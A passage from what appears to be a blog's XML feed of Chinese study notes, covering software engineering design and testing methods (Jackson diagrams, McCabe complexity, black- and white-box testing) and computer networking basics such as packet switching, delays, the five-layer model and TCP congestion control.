title="判定树"></a>判定树</h5><ul><li>是判定表的变种，也能清晰的表示复杂的条件组合与应做的动作之间的对应关系</li><li><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124165509104.png" alt="image-20221124165509104"></li></ul></li><li><h5 id="过程设计语言-PDL"><a href="#过程设计语言-PDL" class="headerlink" title="过程设计语言(PDL)"></a>过程设计语言(PDL)</h5><ul><li>过程设计语言也叫伪码</li><li>用正文形式表示数据和处理过程的设计工具</li></ul></li></ul><h3 id="5-5-面向数据结构的设计方法"><a href="#5-5-面向数据结构的设计方法" class="headerlink" title="5.5 面向数据结构的设计方法"></a>5.5 面向数据结构的设计方法</h3><h5 id="Jackson图"><a href="#Jackson图" class="headerlink" title="Jackson图"></a>Jackson图</h5><p>Jackson图实质上是对第3.7节中介绍的层次方框图的一种精化。读者需要注意的是，虽然Jackson图和描绘软件结构的层次图形式相当类似，但是含义却很不相同，即<strong>层次图中的一个方框通常代表一个模块</strong>；而Jackson图即使在描绘程序结构时，一个方框也并不代表一个模块，<strong>通常一个方框只代表几个语句</strong>。<strong>层次图表现的是调用关系</strong>，通常一个模块除了调用下级模块外，还完成其他操作；而<strong>Jackson图表现的是组成关系</strong>，也就是说，一个方框中包括的操作<strong>仅仅由它下层框中的那些操作组成</strong>。</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124171123364.png" alt="image-20221124171123364"></p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124171202514.png" alt="image-20221124171202514"></p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124171429089.png" alt="image-20221124171429089"></p><h3 id="5-6-程序复杂度定量度量"><a href="#5-6-程序复杂度定量度量" class="headerlink" title="5.6 程序复杂度定量度量"></a>5.6 程序复杂度定量度量</h3><p>程序复杂度定量度量：</p><p>定量的度量详细设计模块的质量。</p><h5 id="McCabe方法"><a href="#McCabe方法" class="headerlink" title="McCabe方法"></a><strong>McCabe方法</strong></h5><p>将程序图转化为程序流程图再计算复杂度。</p><p><strong>计算方法</strong>：</p><ol><li>流图中的区域数等于环形复杂度</li><li>流图G的环形复杂度V(G)&#x3D;E-N+2,E是流图中边的条数，N是结点数。</li><li>流图G的环形复杂度V(G)&#x3D;P+1,其中，P是流图中判定结点的数目。</li></ol><p>V(G)&lt;&#x3D;10比较科学</p><h2 id="六、实现"><a href="#六、实现" class="headerlink" title="六、实现"></a>六、实现</h2><h3 id="6-1-实现"><a href="#6-1-实现" class="headerlink" title="6.1 实现"></a>6.1 实现</h3><p>软件生命周期中的编码和测试统称为<strong>实现</strong>。</p><h5 id="语言选择"><a href="#语言选择" class="headerlink" title="语言选择"></a>语言选择</h5><p>选择适宜的程序设计语言是减少编程的难度、减少程序测试量、容易维护的实现基础。</p><h5 id="编码风格"><a href="#编码风格" class="headerlink" title="编码风格"></a>编码风格</h5><ul><li>程序内部的文档</li><li>数据说明</li><li>语句构造</li><li>输入输出</li><li><strong>效率</strong>：效率主指<strong>处理机时间</strong>和<strong>存储器容量</strong></li></ul><h3 id="6-2-软件测试基础"><a href="#6-2-软件测试基础" class="headerlink" title="6.2 软件测试基础"></a>6.2 软件测试基础</h3><h5 id="软件测试的自标"><a href="#软件测试的自标" class="headerlink" title="软件测试的自标"></a>软件测试的自标</h5><ul><li>软件测试是为了发现错误而执行程序的过程。</li><li>编码阶段（单元测试）</li><li>测试阶段（各种综合测试）</li></ul><h5 id="软件测试准则："><a href="#软件测试准则：" class="headerlink" title="软件测试准则："></a>软件测试准则：</h5><ol><li>所有测试都应该能追溯到用户需求。</li><li>应该远在测试之前就制定测试计划</li><li>Pareto原理：80%的错误是由20%的模块造成的。</li><li>应该从“小规模”测试开始，并逐步进行大规模测试。</li><li>穷举测试是不可能的；测试只能证明程序有错误，但不能证明程序无错误。</li><li>为了尽最大可能的发现错误，应该由独立的第三方担任测试工作。</li></ol><h5 id="软件测试的方法（※）："><a href="#软件测试的方法（※）：" class="headerlink" title="软件测试的方法（※）："></a>软件测试的方法（※）：</h5><h6 id="黑盒测试法："><a href="#黑盒测试法：" class="headerlink" title="黑盒测试法："></a>黑盒测试法：</h6><p>将软件看作一个黑盒子，不考虑其内部结构和处理过程，只按照规格说明书的规定，测试软件是否能够正确接收输入数据，产生正确的输出数据。即测试程序是否正确的实现了其功能。又称为“功能测试”。</p><h6 id="白盒测试法："><a href="#白盒测试法：" class="headerlink" title="白盒测试法："></a>白盒测试法：</h6><p>完全知道程序的内部结构和处理算法，因此可以将程序看作一个透明的白盒子，根据程序内部的逻辑结构测试程序内部的主要执行通路是否能够按照预定的要求正确工作。又称“结构测试”。</p><h5 id="软件测试的步骤："><a href="#软件测试的步骤：" class="headerlink" title="软件测试的步骤："></a>软件测试的步骤：</h5><ol><li><strong>单元测试</strong>（模块测试）：将每个模块作为一个单独的实体进行测试。<strong>发现的错误编码和详细设计阶段的错误</strong></li><li><strong>子系统测试</strong>：将模块集成为一个子系统进行测试。着重测试<strong>模块的接口</strong>。</li><li><strong>系统测试</strong>：将子系统<strong>组装为一个完整的系统进行测试</strong>。子系统测试和系统测试总称为“集成测试</li><li><strong>验收测试</strong>（确认测试）：在用户的参与下，往往<strong>使用实际的数据进行的测试</strong>。发现需求说明中的错误</li><li><strong>平行运行</strong>：<strong>同时运行新开发出来的系统和将被它取代的旧系统</strong>，以便比较新旧两个系统的处理结果。</li></ol><h3 id="6-3-单元测试"><a href="#6-3-单元测试" class="headerlink" title="6.3 单元测试"></a>6.3 单元测试</h3><p><strong>测试依据</strong>：详细设计文档</p><p><strong>测试技术</strong>（设计测试用例的方法）：白盒测试技术</p><p>着重点：</p><ol><li>模块接口</li><li>局部数据结构</li><li>重要的执行通路</li><li>出错处理通路</li><li>边界条件</li></ol><h3 id="6-4-集成测试"><a href="#6-4-集成测试" class="headerlink" title="6.4 集成测试"></a>6.4 集成测试</h3><p><strong>目标</strong>：发现与接口有关的问题</p><p><strong>实施者</strong>：独立的测试机构或第三方人员</p><p><strong>集成方法</strong>：非渐增测试、渐增测试</p><ul><li><strong>自顶向下集成</strong>：从主控模块开始沿着程序的控制层次自顶向下移动，逐步添加新的模块</li><li><strong>自底向上集成</strong>：从最底层模块开始组装</li></ul><p>自顶向下与自底向上相结合的方法：</p><p>上层模块使用自顶向下方法，下层模块采用底向上方法</p><p><strong>回归测试</strong>：重新执行已经做过测试的某个子集，以保证程序的变化没有带来非预期的副作用。</p><h3 id="6-5-确认测试"><a href="#6-5-确认测试" class="headerlink" title="6.5 确认测试"></a>6.5 确认测试</h3><p>又称<strong>验收测试</strong>，目标是验证软件的有效性。</p><p><strong>验证</strong>：为了保证软件正确的实现了某个特定要求而进行的一系列活动。</p><p><strong>确认</strong>：为了保证软件确实满足了用户需求而进行的一系列活动。</p><p>Alpha测试：用户在开发者的场所，在开发者指导下进行。</p><p>Beta测试：用户在用户场所进行，遇到问题报告给开发者，开发者进行修改。</p><h3 id="6-6-白盒测试"><a href="#6-6-白盒测试" class="headerlink" title="6.6 白盒测试"></a>6.6 白盒测试</h3><p>测试用例：测试输入数据和预期的输出结果。</p><p>测试方案：测试目的、测试用例的集合。</p><ul><li><strong>语句覆盖</strong>：被测试程序中的每条语句至少执行一次。</li><li><strong>判定覆盖</strong>：使得被测程序中每个判定表达式至少获得一次“真”值和“假”值</li><li><strong>条件覆盖</strong>：使得判定表达式中每个条件的各种可能的值至少出现一次。</li><li><strong>判定&#x2F;条件覆盖</strong>：使得判定表达式中的每个条件的所有可能取值至少出现一次，并使每个判定表达式所有可能的结果也至少出现一次。</li><li><strong>条件组合覆盖</strong>：设计足够多的测试用例，使得每个判定表达式中条件的各种可能的值的组合都至少出现一次。</li><li><strong>路径覆盖</strong>：覆盖被测程序中所有可能的路径。</li></ul><p><strong>控制结构测试</strong>：基本路径测试、条件测试、循环测试</p><h3 id="6-7-黑盒测试"><a href="#6-7-黑盒测试" class="headerlink" title="6.7 黑盒测试"></a>6.7 黑盒测试</h3><p>黑盒测试又称功能测试，着重测试软件的功能。</p><ul><li><strong>等价类划分法</strong><ol><li>把程序的输入数据集合按输入条件划分为若干个等价类，每一个等价类相对于输入条件表示为一组<strong>有效</strong>或<strong>无效</strong>的输入。</li><li>为每一等价类设计一个测试用例。</li></ol></li><li><strong>边界值分析法</strong><ul><li>输入等价类和输出等价类的边界就是应该着重测试的程序边界情况。选取的测试数据应该刚好<strong>等于</strong>、刚好<strong>小于</strong>、刚好<strong>大于</strong>边界值</li></ul></li></ul><h3 id="6-8-调试"><a href="#6-8-调试" class="headerlink" title="6.8 调试"></a>6.8 调试</h3><p>调试（也称为纠错）是在测试发现错误之后排除错误的过程。</p><p><strong>方法</strong>：<strong>蛮干法、回溯法、原因排除法</strong></p><p>结果：</p><ul><li>找到了原因，然后改正和排除。</li><li>没找到原因，猜测一个原因，并设计附加测试用例来验证这个假设。</li></ul><h3 id="6-9-软件可靠性"><a href="#6-9-软件可靠性" class="headerlink" title="6.9 软件可靠性"></a>6.9 软件可靠性</h3><p><strong>软件可靠性</strong>：程序在给定<strong>时间间隔</strong>内，按照规格说明书的规定成功运行的概率。<br><strong>软件可用性</strong>：程序在给定<strong>时间点</strong>，按照规格说明书的规定成功运行的概率</p>]]></content>
      
      
      <categories>
          
          <category> log </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TEST_GIT</title>
      <link href="/2022/09/29/TEST_GIT/"/>
      <url>/2022/09/29/TEST_GIT/</url>
      
        <content type="html"><![CDATA[<h1 id="TEST-GIT"><a href="#TEST-GIT" class="headerlink" title="TEST_GIT"></a>TEST_GIT</h1><p>this is a test sentence!!!</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="/2022/07/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2022/07/01/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><h2 id="第1章-概述"><a href="#第1章-概述" class="headerlink" title="第1章-概述"></a>第1章-概述</h2><h3 id="1、典型交换技术"><a href="#1、典型交换技术" class="headerlink" title="1、典型交换技术"></a>1、典型交换技术</h3><h4 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630100123179.png" alt="image-20220630100123179"></p><p>当电话机的数量增多时，使用电话交换机将这些电话连接起来。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630100255993.png" alt="image-20220630100255993"></p><h5 id="三个阶段"><a href="#三个阶段" class="headerlink" title="三个阶段"></a>三个阶段</h5><ol><li>建立连接：建立一条专用的物理通路（占用通信资源）。</li><li>通话：主叫和被叫双方互相通电话（一直占用通信资源）。</li><li>释放连接：释放刚才使用的专用的物理通路（归还通信资源）。</li></ol><h5 id="电路交换特点"><a href="#电路交换特点" class="headerlink" title="电路交换特点"></a>电路交换特点</h5><p>通话的两个用户始终占用端到端的通信资源</p><h5 id="不使用电路交换的原因"><a href="#不使用电路交换的原因" class="headerlink" title="不使用电路交换的原因"></a>不使用电路交换的原因</h5><p>计算机数据具有突发性，这导致在传送数据时，通信线路的利用率很低，真正用来传送数据的时间往往不到 10%，甚至不到 1%，已被用户占用的通信线路资源在绝大部分时间里都是空闲的。</p><h4 id="x3D-x3D-分组交换-x3D-x3D"><a href="#x3D-x3D-分组交换-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;分组交换&#x3D;&#x3D;"></a>&#x3D;&#x3D;分组交换&#x3D;&#x3D;</h4><h5 id="分组交换特点"><a href="#分组交换特点" class="headerlink" title="分组交换特点"></a>分组交换特点</h5><ul><li><p>采用<strong>存储转发</strong>技术。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630100543103.png" alt="image-20220630100543103"></p></li><li><p>数据段前面添加首部就构成了分组 (packet)<br><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630100743240.png" alt="image-20220630100743240"></p></li><li><p>发送端依次把各分组发送到接收端。<br>互联网采用分组交换技术。分组是在互联网中传送的数据单元。</p></li><li><p>接收端收到分组后剥去首部，还原成原来的报文<br><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630100754050.png" alt="image-20220630100754050"></p></li></ul><h5 id="路由器处理分组的过程"><a href="#路由器处理分组的过程" class="headerlink" title="路由器处理分组的过程"></a>路由器处理分组的过程</h5><ol><li>暂存收到的分组。</li><li>检查分组首部。</li><li>查找转发表。</li><li>按照首部中的目的地址，找到合适的接口转发出去。</li></ol><h5 id="分组交换的优点"><a href="#分组交换的优点" class="headerlink" title="分组交换的优点"></a>分组交换的优点</h5><table><thead><tr><th><strong>优点</strong></th><th align="center"><strong>所采用的手段</strong></th></tr></thead><tbody><tr><td><strong>高效</strong></td><td align="center">在分组传输的过程中<strong>动态分配</strong>传输带宽，对通信链路是<strong>逐段</strong>占用。</td></tr><tr><td><strong>灵活</strong></td><td align="center">为每一个分组<strong>独立</strong>地选择最合适的转发<strong>路由</strong>。</td></tr><tr><td><strong>迅速</strong></td><td align="center">以分组作为传送单位，可以<strong>不先建立连接</strong>就能向其他主机发送<strong>分组</strong>。</td></tr><tr><td><strong>可靠</strong></td><td align="center">保证可靠性的网络协议；分布式多路由的分组交换网，使网络有很好的<strong>生存性</strong>。</td></tr></tbody></table><h5 id="分组交换的缺点"><a href="#分组交换的缺点" class="headerlink" title="分组交换的缺点"></a>分组交换的缺点</h5><ul><li>排队延迟：分组在各路由器存储转发时需要排队。</li><li>不保证带宽：动态分配。</li><li>增加开销：各分组必须携带控制信息；路由器要暂存分组，维护转发表等。</li></ul><h4 id="x3D-x3D-电路交换、报文交换和分组交换的主要区别-x3D-x3D"><a href="#x3D-x3D-电路交换、报文交换和分组交换的主要区别-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;电路交换、报文交换和分组交换的主要区别&#x3D;&#x3D;"></a>&#x3D;&#x3D;电路交换、报文交换和分组交换的主要区别&#x3D;&#x3D;</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630101315505.png" alt="image-20220630101315505"></p><ul><li>若要连续传送大量的数据，且其传送时间远大于连接建立时间，则电路交换的传输速率较快。</li><li>报文交换和分组交换不需要预先分配传输带宽，在传送突发数据时可提高整个网络的信道利用率。</li><li>由于一个分组的长度往往远小于整个报文的长度，因此分组交换比报文交换的时延小，同时也具有更好的灵活性。</li></ul><h3 id="2、几种不同类别的计算机网络"><a href="#2、几种不同类别的计算机网络" class="headerlink" title="2、几种不同类别的计算机网络"></a>2、几种不同类别的计算机网络</h3><h4 id="按照网络的作用范围进行分类"><a href="#按照网络的作用范围进行分类" class="headerlink" title="按照网络的作用范围进行分类"></a>按照网络的作用范围进行分类</h4><table><thead><tr><th><strong>类别</strong></th><th><strong>作用范围或距离</strong></th></tr></thead><tbody><tr><td><strong>广域网</strong> <strong>WAN</strong> <strong>(Wide Area Network)</strong></td><td>通常为几十到几千公里。有时也称为**<strong>远程网</strong>(long haul network)**。是互联网的核心部分。</td></tr><tr><td><strong>城域网</strong> <strong>MAN</strong> <strong>(Metropolitan Area Network)</strong></td><td>作用范围一般是一个城市，作用距离约为<strong>5~50</strong>公里。</td></tr><tr><td><strong>局域网</strong> <strong>LAN</strong> <strong>(Local Area Network)</strong></td><td>局限在较小的范围（如<strong>1公里</strong>左右）。通常采用高速通信线路。</td></tr><tr><td><strong>个人区域网</strong> <strong>PAN</strong> <strong>(Personal Area Network)</strong></td><td>范围很小，大约在<strong>10米</strong>左右。有时也称为<strong>无线个人区域网</strong> **WPAN (Wireless PAN)**。</td></tr></tbody></table><h3 id="x3D-x3D-3、计算机网络的性能指标-x3D-x3D"><a href="#x3D-x3D-3、计算机网络的性能指标-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;3、计算机网络的性能指标&#x3D;&#x3D;"></a>&#x3D;&#x3D;3、计算机网络的性能指标&#x3D;&#x3D;</h3><h4 id="1-速率"><a href="#1-速率" class="headerlink" title="1. 速率"></a>1. 速率</h4><ul><li>最重要的一个性能指标。</li><li>指的是数据的传送速率，也称为数据率 (data rate) 或比特率 (bit rate)。</li><li>单位：bit&#x2F;s，或 kbit&#x2F;s、Mbit&#x2F;s、 Gbit&#x2F;s 等。<br>例如 4 × 10^10^  bit&#x2F;s 的数据率就记为 40 Gbit&#x2F;s。</li><li>速率往往是指额定速率或标称速率，非实际运行速率。</li><li><strong>通信领域</strong><br>k(kilo)&#x3D;10^3^&#x3D;千，M(Mega)&#x3D;10^6^&#x3D;兆，G(Giga)&#x3D;10^9^&#x3D;吉，T(Tera)10^12^&#x3D;太，P(Peta)&#x3D;10^15^&#x3D;拍，E(Exa)&#x3D;10^18^&#x3D;艾，Z(Zeta)&#x3D;10^21^&#x3D;泽，Y(Yotta)&#x3D;10^24^&#x3D;尧</li><li><strong>计算机领域</strong><br>千 &#x3D; K &#x3D; 2^10^ &#x3D; 1024，兆 &#x3D; M &#x3D; 2^20^ &#x3D; 1024 K，吉 &#x3D; G &#x3D; 2^30^ &#x3D; 1024 M</li></ul><h4 id="2-带宽"><a href="#2-带宽" class="headerlink" title="2. 带宽"></a>2. 带宽</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630102738607.png" alt="image-20220630102738607"></p><h4 id="x3D-x3D-3-时延-x3D-x3D"><a href="#x3D-x3D-3-时延-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;3.时延&#x3D;&#x3D;"></a>&#x3D;&#x3D;3.时延&#x3D;&#x3D;</h4><h5 id="（1）发送时延（传输时延）"><a href="#（1）发送时延（传输时延）" class="headerlink" title="（1）发送时延（传输时延）"></a>（1）发送时延（传输时延）</h5><p>是主机或路由器发送数据帧所需要的时间，也就是从发送数据帧的<strong>第一个比特</strong>算起，到该帧的<strong>最后一个比特</strong>发送完毕所需的时间。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630103127924.png" alt="image-20220630103127924"></p><h5 id="（2）传播时延"><a href="#（2）传播时延" class="headerlink" title="（2）传播时延"></a>（2）传播时延</h5><ul><li>是电磁波在信道中传播一定的距离需要花费的时间。</li><li>电磁波传播速率：<ul><li>自由空间的传播速率是光速 &#x3D; 3.0 ⅹ 10^5^ km&#x2F;s</li><li>在铜线电缆中的传播速率约 &#x3D; 2.3 ⅹ 10^5^km&#x2F;s</li><li>在光纤中的传播速率约 &#x3D; 2.0 ⅹ 10^5^ km&#x2F;s</li></ul></li></ul><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630103237817.png" alt="image-20220630103237817"></p><p><strong>注意</strong>：发送时延与传播时延有本质上的不同。</p><p><strong>发送时延</strong>发生在机器内部的发送器中，与传输信道的长度（或信号传送的距离）没有任何关系。</p><p><strong>传播时延</strong>则发生在机器外部的传输信道媒体上，而与信号的发送速率无关。信号传送的距离越远，传播时延就越大。</p><h5 id="（3）处理时延"><a href="#（3）处理时延" class="headerlink" title="（3）处理时延"></a>（3）处理时延</h5><p>主机或路由器在收到分组时，为处理分组（例如分析首部、提取数据、差错检验或查找路由）所花费的时间。 </p><h5 id="（4）排队时延"><a href="#（4）排队时延" class="headerlink" title="（4）排队时延"></a>（4）排队时延</h5><ul><li>分组在路由器输入输出队列中排队等待处理和转发所经历的时延。</li><li>排队时延的长短往往取决于网络中当时的通信量。当网络的通信量很大时会发生队列溢出，使分组丢失，这相当于排队时延为无穷大。</li></ul><h5 id="总时延-x3D-发送时延-传播时延-处理时延-排队时延"><a href="#总时延-x3D-发送时延-传播时延-处理时延-排队时延" class="headerlink" title="总时延  &#x3D; 发送时延 + 传播时延 + 处理时延 + 排队时延"></a>总时延  &#x3D; 发送时延 + 传播时延 + 处理时延 + 排队时延</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630103504001.png" alt="image-20220630103504001"></p><h5 id="x3D-x3D-例题-x3D-x3D"><a href="#x3D-x3D-例题-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;例题&#x3D;&#x3D;"></a>&#x3D;&#x3D;例题&#x3D;&#x3D;</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630103823430.png" alt="image-20220630103823430"></p><h4 id="4-时延带宽积"><a href="#4-时延带宽积" class="headerlink" title="4.时延带宽积"></a>4.时延带宽积</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630104121328.png" alt="image-20220630104121328"></p><h4 id="5-往返时间-RTT-Round-Trip-Time"><a href="#5-往返时间-RTT-Round-Trip-Time" class="headerlink" title="5.往返时间 RTT (Round-Trip Time)"></a>5.往返时间 RTT (Round-Trip Time)</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630104258193.png" alt="image-20220630104258193"></p><h5 id="x3D-x3D-例题-x3D-x3D-1"><a href="#x3D-x3D-例题-x3D-x3D-1" class="headerlink" title="&#x3D;&#x3D;例题&#x3D;&#x3D;"></a>&#x3D;&#x3D;例题&#x3D;&#x3D;</h5><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630104353332.png" alt="image-20220630104353332"></p><h4 id="6-利用率"><a href="#6-利用率" class="headerlink" title="6.利用率"></a>6.利用率</h4><p>根据排队论，当某信道的利用率增大时，时延会迅速增加。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630104621713.png" alt="image-20220630104621713"></p><h3 id="4、具有五层协议的体系结构"><a href="#4、具有五层协议的体系结构" class="headerlink" title="4、具有五层协议的体系结构"></a>4、具有五层协议的体系结构</h3><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630105931289.png" alt="image-20220630105931289"></p><p><strong>网络协议三要素：语法、语义、时序</strong></p><h4 id="1、物理层"><a href="#1、物理层" class="headerlink" title="1、物理层"></a>1、物理层</h4><ul><li>任务：实现比特（0 或 1）的传输。</li><li>确定连接电缆的插头应当有多少根引脚，以及各引脚应如何连接。</li><li>注意：传递信息所利用的一些物理媒体，如双绞线、同轴电缆、光缆、无线信道等，并不在物理层协议之内，而是在物理层协议的下面。</li></ul><h4 id="2、数据链路层"><a href="#2、数据链路层" class="headerlink" title="2、数据链路层"></a>2、数据链路层</h4><ul><li>常简称为链路层。</li><li>任务：实现两个相邻节点之间的可靠通信。</li><li>在两个相邻节点间的链路上传送帧（frame）。</li><li>如发现有差错，就简单地丢弃出错帧。</li><li>如果需要改正出现的差错，就要采用可靠传输协议来纠正出现的差错。这种方法会使数据链路层协议复杂。</li></ul><h4 id="3、网络层"><a href="#3、网络层" class="headerlink" title="3、网络层"></a>3、网络层</h4><ul><li>为分组交换网上的不同主机提供通信服务。</li><li>两个具体任务：<ul><li>路由选择：通过一定的算法，在互联网中的每一个路由器上，生成一个用来转发分组的转发表。</li><li>转发：每一个路由器在接收到一个分组时，要依据转发表中指明的路径把分组转发到下一个路由器。</li></ul></li><li>互联网使用的网络层协议是无连接的网际协议 IP  (Internet Protocol) 和许多种路由选择协议，因此互联网的网络层也叫做网际层或 IP 层。</li><li>IP 协议分组也叫做 IP 数据报，或简称为数据报。</li></ul><h4 id="4、运输层"><a href="#4、运输层" class="headerlink" title="4、运输层"></a>4、运输层</h4><ul><li>任务：负责向两台主机中进程之间的通信提供通用的数据传输服务。</li><li>具有复用和分用的功能。</li><li>主要使用两种协议： <ul><li>传输控制协议 TCP <ul><li>提供面向连接的、可靠的数据传输服务。</li><li>数据传输的单位是报文段 (segment)。</li></ul></li><li>用户数据报协议 UDP 。<ul><li>提供无连接的尽最大努力 (best-effort) 的数据传输服务（不保证数据传输的可靠性）。</li><li>数据传输的单位是用户数据报。</li></ul></li></ul></li></ul><h4 id="5、应用层"><a href="#5、应用层" class="headerlink" title="5、应用层"></a>5、应用层</h4><ul><li>任务：通过应用进程间的交互来完成特定网络应用。</li><li>协议：定义的是应用进程间通信和交互的规则。</li><li>把应用层交互的数据单元称为报文(message)。</li><li>例如：DNS，HTTP，SMTP</li></ul><h4 id="数据在各层之间的传递过程"><a href="#数据在各层之间的传递过程" class="headerlink" title="数据在各层之间的传递过程"></a>数据在各层之间的传递过程</h4><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630110423372.png" alt="image-20220630110423372"></p><h2 id="2、TCP滑动窗口"><a href="#2、TCP滑动窗口" class="headerlink" title="2、TCP滑动窗口"></a>2、TCP滑动窗口</h2><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630172824843.png" alt="image-20220630172824843"></p><h2 id="3、拥塞避免和快速重传"><a href="#3、拥塞避免和快速重传" class="headerlink" title="3、拥塞避免和快速重传"></a>3、拥塞避免和快速重传</h2><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630172924622.png" alt="image-20220630172924622"></p><p>当TCP连接已建立后，把拥塞窗口cwnd置为1。在本例中，慢开始门限的初始值设置为l6个报文段，即ssthresh&#x3D;16。在执行<strong>慢开始算法</strong>阶段，每经过一个往返时间RTT，拥塞窗口cwnd就<strong>加倍</strong>。当拥塞窗口cwnd增长到慢开始门限值ssthresh时（图中的点①，此时拥塞窗口cwd&#x3D;16)，就改为执行<strong>拥塞避免算法</strong>，拥塞窗口按<strong>线性规律增长</strong>。但请注意，“拥塞避免”并非完全避免拥塞，而是让拥塞窗口增长得缓慢些，使网络不容易出现拥塞。</p><p>当拥塞窗口cwd&#x3D;24时，网络出现了超时（图中的点②），这就是网络发生拥塞的标志。<strong>于是调整门限值ssthresh&#x3D;cwnd&#x2F;2&#x3D;12，同时设置拥塞窗口cwnd&#x3D;1，执行慢开始算法。</strong>按照慢开始算法，发送方每收到一个对新报文段的确认ACK，就把拥塞窗口值加1。</p><p>当拥塞窗口cwnd&#x3D;ssthresh&#x3D;12时（图中的点③，这是ssthresh第1次调整后的数值），改为执行<strong>拥塞避免算法</strong>，拥塞窗口按<strong>线性规律增大</strong>。当拥塞窗口cwd&#x3D;16时（图中的点④），出现了一个新的情况，就是发送方一连收到<strong>3个对同一个报文段的重复确认</strong>（图中记为3-ACK)。关于这个问题要解释如下。有时，<strong>个别报文段会在网络中意外丢失，但实际上网络并未发生拥塞</strong>。如果发送方迟迟收不到确认，就会产生超时，并误认为网络发生了拥塞。这就导致发送方错误地启动慢开始，把拥塞窗口cwd又设置为1，因而不必要地降低了传输效率。</p><p>采用快重传算法可以让发送方尽早知道发生了个别报文段的丢失。快重传算法首先要求接收方不要等待自己发送数据时才进行捎带确认，而是要<strong>立即发送确认</strong>，即使收到了失序的报文段也要立即发出对已收到的报文段的重复确认。如图5-26所示，接收方收到了M1和M2后都分别及时发出了确认。现假定接收方没有收到M3但却收到了M4。本来接收方可以什么都不做。但按照快重传算法，<strong>接收方必须立即发送对M2的重复确认，以便让发送方及早知道接收方没有收到报文段M3</strong>。发送方接着发送M5和M6。接收方收到后也仍要再次分别发出对M2的重复确认。这样，发送方共收到了接收方的<strong>4个对M2的确认</strong>，其中后3个都是重复确认。<strong>快重传算法规定，发送方只要一连收到3个重复确认，就可知道现在并未出现网络拥塞，而只是接收方少收到一个报文段M3，因而立即进行重传M3(即“快重传”)。</strong>使用快重传可以使整个网络的吞吐量提高约20%。</p><p>因此，在图5-25中的点④，发送方知道现在只是丢失了个别的报文段。于是不启动慢开始，而是执行<strong>快恢复算法</strong>。这时，发送方第2次调整门限值，使<strong>ssthresh&#x3D;cwnd&#x2F;2&#x3D;8，同时设置拥塞窗口cwnd&#x3D;ssthresh&#x3D;8</strong>(见图5-25中的点⑤)，并开始执行<strong>拥塞避免算法</strong>。</p><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630173645768.png" alt="image-20220630173645768"></p><h2 id="4、TCP连接的建立"><a href="#4、TCP连接的建立" class="headerlink" title="4、TCP连接的建立"></a>4、TCP连接的建立</h2><p><img src="/../pic/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C.assets/image-20220630173926535.png" alt="image-20220630173926535"></p><h2 id="5、TCP连接的释放"><a href="#5、TCP连接的释放" class="headerlink" title="5、TCP连接的释放"></a>5、TCP连接的释放</h2><p><img 